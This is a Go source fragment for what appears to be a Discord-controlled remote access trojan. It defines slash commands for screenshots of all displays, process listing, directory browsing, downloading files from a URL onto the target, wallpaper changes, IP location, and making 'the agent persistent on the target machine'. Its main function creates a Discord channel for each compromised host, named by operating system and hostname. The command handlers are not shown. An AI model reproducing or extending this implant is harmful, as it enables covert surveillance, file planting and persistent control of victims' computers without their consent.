			Name:        "screenshot",
			Description: "Take a screenshot of all displays and send it to the channel",
		},
		{
			Name:        "shutdown",
			Description: "Shuts down the bot.",
		},
		{
			Name:        "location",
			Description: "Get your current IP location.",
		},
		{
			Name:        "cd",
			Description: "Change the working directory.",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Name:        "path",
					Description: "The path to change to.",
					Type:        discordgo.ApplicationCommandOptionString,
					Required:    true,
				},
			},
		},
		{
			Name:        "ls",
			Description: "List the contents of a directory.",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Name:        "path",
					Description: "The directory path to list contents from.",
					Type:        discordgo.ApplicationCommandOptionString,
					Required:    false,
				},
			},
		},
		{
			Name:        "process",
			Description: "List all the processes running on the target machine",
		},
		{
			Name:        "persistent",
			Description: "Make the agent persistent on the target machine.",
		},
		{
			Name:        "upload",
			Description: "Upload a file from a URL to a specified path.",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "url",
					Description: "URL of the file to upload.",
					Required:    true,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "path",
					Description: "Path to save the uploaded file.",
					Required:    true,
				},
			},
		},
		{
			Name:        "wallpaper",
			Description: "Change the wallpaper of the target machine.",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "url",
					Description: "The URL of the image to set as wallpaper.",
					Required:    true,
				},
			},
		},
	}

	for _, command := range commands {
		registerCommand(s, command)
	}
}

func main() {
	// Get token and channel ID from environment variables
	token := "BOT_TOKEN"
	myChannelId = "CHANNEL_ID"

	// Create a new Discord session
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("Error creating Discord session,", err)
		return
	}

	// Register the message handler
	dg.AddHandler(handler)
	// dg.Identify.Intents = discordgo.IntentsGuildMessages

	// Register the slash command handler
	dg.AddHandler(interactionHandler)

	// Open a websocket connection to Discord
	err = dg.Open()
	if err != nil {
		fmt.Println("Error opening connection,", err)
		return
	}

	// Register slash commands
	go registerSlashCommands(dg)

	rand.Seed(time.Now().UnixNano())
	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println("Error getting current user:", err)
		return
	}
	sessionId := fmt.Sprintf("%s_%s", runtime.GOOS, hostname)
	c, err := dg.GuildChannelCreate("CHANNEL_ID", sessionId, 0) // Replace with your guild ID
	if err != nil {
		fmt.Println("Error creating channel:", err)
		return
	}
	myChannelId = c.ID

	// Send the embed message and pin it
	err = sendAndPinEmbedMessage(dg, myChannelId, sessionId, hostname)
	if err != nil {
		fmt.Println("Error sending and pinning embed message:", err)
		return
	}

	// Wait for interrupt signal to gracefully close
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	// Close the Discord session
	dg.Close()
}
